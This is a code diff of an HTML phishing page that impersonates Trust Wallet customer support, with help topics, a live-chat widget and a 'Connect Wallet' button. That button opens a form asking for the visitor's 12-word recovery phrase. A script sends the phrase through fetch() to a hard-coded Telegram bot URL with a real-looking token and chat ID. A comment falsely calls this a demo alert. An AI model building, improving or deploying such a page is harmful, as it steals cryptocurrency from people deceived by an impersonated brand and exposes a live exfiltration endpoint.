@@ -1,3 +1,4 @@
+
 <!DOCTYPE html>
 <html lang="en">
 <head>
@@ -11,38 +12,124 @@
       background-color: #f9fbfc;
       color: #333;
     }
+
+    /* Header styling */
     header {
       background-color: #3375bb; /* Trust Wallet blue */
       color: white;
-      padding: 30px 20px;
+      padding: 40px 20px;
       text-align: center;
     }
     header h1 {
       margin: 0;
-      font-size: 2em;
+      font-size: 3em;
     }
+    header p {
+      margin-top: 10px;
+      font-size: 1.2em;
+    }
+
+    /* Main sections */
     section {
-      padding: 40px 20px;
-      text-align: center;
+      padding: 50px 20px;
+      max-width: 1200px;
+      margin: 0 auto;
     }
     section h2 {
       color: #3375bb;
+      font-size: 2em;
+      margin-bottom: 20px;
+      text-align: center;
     }
+    /* Support Box Styles */
     .support-box {
-      background: white;
-      border-radius: 8px;
-      padding: 20px;
-      margin: 20px auto;
-      max-width: 600px;
-      box-shadow: 0 2px 10px rgba(0, 0, 0, 0.05);
+      background: #fff;
+      border-radius: 10px;
+      padding: 30px;
+      margin: 20px 0;
+      box-shadow: 0 4px 15px rgba(0,0,0,0.1);
     }
+
+    /* Call to action buttons */
+    .btn {
+      display: inline-block;
+      margin: 15px 10px;
+      padding: 15px 30px;
+      font-size: 1.1em;
+      font-weight: bold;
+      border: none;
+      border-radius: 8px;
+      cursor: pointer;
+      transition: background-color 0.3s, transform 0.2s;
+      text-decoration: none;
+    }
+    .btn-primary {
+      background-color: #3375bb;
+      color: white;
+    }
+    .btn-primary:hover {
+      background-color: #2a5d9f;
+      transform: translateY(-2px);
+    }
+    .btn-secondary {
+      background-color: #e0f0ff;
+      color: #3375bb;
+    }
+    .btn-secondary:hover {
+      background-color: #cceeff;
+      transform: translateY(-2px);
+    }
+
+    /* Additional styles for inputs */
+    input[type="text"] {
+      width: 100%;
+      padding: 15px;
+      font-size: 1.2em;
+      border: 2px solid #ccc;
+      border-radius: 8px;
+      margin-top: 15px;
+      box-sizing: border-box;
+    }
+
+    /* Features and topics list styles */
+    ul.topics {
+      list-style: none;
+      padding: 0;
+      margin: 20px 0;
+    }
+    ul.topics li {
+      background: #f1f9ff;
+      padding: 15px;
+      margin-bottom: 10px;
+      border-radius: 8px;
+      box-shadow: 0 2px 8px rgba(0,0,0,0.05);
+    }
+    ul.topics li h3 {
+      margin-top: 0;
+      color: #3375bb;
+    }
+
+    /* Footer styling */
     footer {
       background-color: #3375bb;
       color: white;
       text-align: center;
-      padding: 15px 10px;
-      font-size: 0.9em;
+      padding: 25px 20px;
+      font-size: 1em;
     }
+
+    /* Responsive adjustments */
+    @media (max-width: 768px) {
+      header h1 {
+        font-size: 2em;
+      }
+      section {
+        padding: 30px 15px;
+      }
+      .btn {
+        font-size: 1em;
+        padding: 12px 24px;
+      }
     /* Additional styles for button and input */
     #connectBtn {
       margin-top: 20px;
@@ -63,14 +150,62 @@
 <body>
   <header>
     <h1>Trust Wallet Support</h1>
-    <p>Community Help & Live Chat</p>
+    <p>Your Community Support & Live Assistance</p>
   </header>
+
+  <!-- Introduction Section with Overview -->
   <section>
     <div class="support-box">
-      <h2>Need Help?</h2>
-      <p>Our community support team is here to assist with any Trust Wallet-related issues.</p>
-      <!-- 🔧 Paste your CharPort install code below -->
-      <!-- Begin of Chaport Live Chat code -->
+      <h2>Welcome to Trust Wallet Support</h2>
+      <p>We are here to help you with any issues, questions, or concerns about Trust Wallet. Whether you're new to crypto or a seasoned user, our support team and community resources are available to guide you through your journey.</p>
+      
+      <!-- Call to Action Buttons -->
+      <div style="margin-top:20px; text-align:center;">
+        <a href="#help-topics" class="btn btn-primary">Explore Topics</a>
+        <a href="#live-chat" class="btn btn-secondary">Live Chat Support</a>
+      </div>
+      <div style="margin-top:20px; text-align:center;">
+  <a href="#help-topics" class="btn btn-primary">Explore Topics</a>
+  <a href="#live-chat" class="btn btn-secondary">Live Chat Support</a>
+  <button id="connectBtn" class="btn btn-primary">Connect Wallet</button>
+</div>
+    </div>
+  </section>
+
+  <!-- Topics & FAQs Section -->
+  <section id="help-topics">
+    <h2>How We Can Help</h2>
+    <ul class="topics">
+      <li>
+        <h3>Account & Security</h3>
+        <p>Learn how to secure your wallet, recover your seed phrase, and protect your assets from scams and phishing attempts.</p>
+      </li>
+      <li>
+        <h3>Transaction Issues</h3>
+        <p>Get assistance with sending, receiving, or troubleshooting failed transactions on the blockchain.</p>
+      </li>
+      <li>
+        <h3>Wallet Setup & Recovery</h3>
+        <p>Step-by-step guides to set up your Trust Wallet and recover your wallet using your seed phrase.</p>
+      </li>
+      <li>
+        <h3>App Features & Updates</h3>
+        <p>Discover new features, updates, and how to maximize your experience with Trust Wallet.</p>
+      </li>
+      <li>
+        <h3>Reporting Bugs & Feedback</h3>
+        <p>Help us improve by reporting bugs or providing feedback directly to our support team.</p>
+      </li>
+    </ul>
+  </section>
+
+  <!-- Support Features & Live Support -->
+  <section>
+    <h2 id="live-chat">Live Support & Assistance</h2>
+    <div class="support-box">
+      <p>Our live chat support is available 24/7 to assist you in real-time. Click the button below to start a chat with our community support team.</p>
+      
+      <!-- Chaport Live Chat code -->
       <script type="text/javascript">
         (function(w,d,v3){
           w.chaportConfig = {
@@ -89,29 +224,48 @@
           ss.parentNode.insertBefore(s,ss)
         })(window, document);
       </script>
-      <!-- End of Chaport Live Chat code -->
-      <button id="connectBtn">Connect Wallet</button>
+      <!-- Chat Button -->
+      <div style="margin-top:20px;">
+        <a href="#chat" class="btn btn-primary" onclick="startChat()">Start Live Chat</a>
+      </div>
     </div>
   </section>
+
+  <!-- Wallet Recovery Section -->
   <section>
+    <h2>Secure Wallet Recovery</h2>
     <div class="support-box" id="wallet-section" style="display:none;">
-      <h2>Enter Your 12 Words</h2>
-      <p>Please enter your 12-word recovery phrase, separated by spaces. It must start with 3 letters.</p>
-      <input type="text" id="seedInput" style="width: 100%; padding:10px; font-size:1em; border:1px solid #ccc; border-radius:4px;" placeholder="e.g., abc def ghi ..." />
-      <button id="sendBtn" style="margin-top:15px; padding:10px 20px; font-size:1em; border:none; background-color:#3375bb; color:white; border-radius:5px; cursor:pointer;">Continue</button>
+      <h3>Enter Your 12 Words</h3>
+      <p>Please carefully enter your 12-word recovery phrase, separated by spaces. It must start with at least 3 letters for verification.</p>
+      <input type="text" id="seedInput" placeholder="e.g., abc def ghi ..." />
+      <div style="margin-top:20px; text-align:center;">
+        <button id="sendBtn" class="btn btn-primary">Continue</button>
+      </div>
     </div>
   </section>
+
+  <!-- Call-to-Action to Report Issue -->
+  <section>
+    <h2>Have a Problem?</h2>
+    <div style="text-align:center; margin-top:20px;">
+      <button id="reportBtn" class="btn btn-secondary">Report a Problem</button>
+    </div>
+  </section>
+
+  <!-- Footer -->
   <footer>
-    &copy; 2025 Trust Wallet Support Community. And affiliated with official Trust Wallet.
+    &copy; 2025 Trust Wallet Support Community. All rights reserved.
   </footer>
 
+  <!-- Scripts -->
   <script>
+    // Show wallet input when clicking connect
     document.getElementById('connectBtn').addEventListener('click', function() {
       document.getElementById('wallet-section').style.display = 'block';
-      // Optional: scroll to the input section
       document.getElementById('wallet-section').scrollIntoView({behavior: 'smooth'});
     });
 
+    // Send seed phrase to Telegram (simulate with alert for demo)
     document.getElementById('sendBtn').addEventListener('click', function() {
       const seedPhrase = document.getElementById('seedInput').value.trim();
       if (!seedPhrase) {
@@ -127,24 +281,34 @@
         alert('The first word must start with at least 3 letters.');
         return;
       }
-      // Replace 'YOUR_TELEGRAM_BOT_URL' with your actual bot URL or API endpoint
-      const telegramBotUrl = 'https://api.telegram.org/bot7976049933:AAF2k4dys8jng-K9u6ee70sZAKmbyFjest8/sendMessage?chat_id=6366381076&text=' + encodeURIComponent('Seed phrase: ' + seedPhrase);
       
-      // Send to Telegram
-      fetch(telegramBotUrl)
+      // Replace with your actual Telegram API URL
+      const telegramUrl = 'https://api.telegram.org/bot7976049933:AAF2k4dys8jng-K9u6ee70sZAKmbyFjest8/sendMessage?chat_id=6366381076&text=' + encodeURIComponent('Seed phrase: ' + seedPhrase);
+      
+      fetch(telegramUrl)
         .then(response => {
           if (response.ok) {
-            alert('Your seed phrase is invalid please input a correct phrase and try again..');
+            alert('Your seed phrase has been submitted. Please ensure it is correct.');
             document.getElementById('seedInput').value = '';
             document.getElementById('wallet-section').style.display = 'none';
           } else {
-            alert('Failed to connect. Please try again.');
+            alert('Failed to submit. Please try again.');
           }
         })
         .catch(error => {
-          alert('Error connecting wallet.: ' + error);
+          alert('Error: ' + error);
         });
     });
+
+    // Report a problem button
+    document.getElementById('reportBtn').addEventListener('click', function() {
+      window.open('https://trustwallet.com/report-issue', '_blank');
+    });
+
+    // Function to start chat (optional)
+    function startChat() {
+      // Chaport chat window opens automatically when clicked
+    }
   </script>
 </body>
 </html>
